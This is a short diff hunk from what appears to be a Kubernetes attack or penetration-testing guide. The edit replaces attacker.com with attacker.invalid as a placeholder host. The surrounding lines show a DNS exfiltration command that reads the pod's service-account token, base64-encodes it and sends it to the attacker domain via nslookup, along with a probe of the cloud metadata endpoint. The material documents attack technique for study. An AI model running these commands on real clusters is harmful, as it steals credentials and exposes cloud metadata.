@@ -696,7 +696,7 @@ kubectl get networkpolicies -A
 
 # 1. DNS-based exfiltration (port 53 is rarely blocked)
 # Encode data in DNS queries
-nslookup $(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 | head -c 60).attacker.com
+nslookup $(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 | head -c 60).attacker.invalid
 
 # 2. Metadata service (169.254.169.254) may not be covered by network policies
 curl -s http://169.254.169.254/latest/meta-data/
